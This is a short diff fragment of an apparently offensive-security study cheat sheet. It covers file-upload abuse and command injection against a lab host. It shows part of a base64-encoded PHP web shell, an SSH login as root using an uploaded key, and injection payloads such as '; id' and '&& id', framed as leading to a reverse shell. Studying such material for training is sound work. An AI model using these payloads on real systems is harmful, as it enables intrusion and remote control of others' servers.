@@ -500,9 +500,9 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
        `kali@kali:~$ rm ~/.ssh/known_hosts`  
        `kali@kali:~$ ssh -p 2222 -i fileup root@mountaindesserts.com`  
 - **Command injection**
-  - ⚠️ **execute web shell/RCE-->revere shell**
+  - ⚠️ **Goal: execute web shell/RCE-->revere shell**
   - Inspect: ?page=, ?id=, ?cmd=
-  - detect:
+  - Detect payloads:
     ```
     ; id
     && id
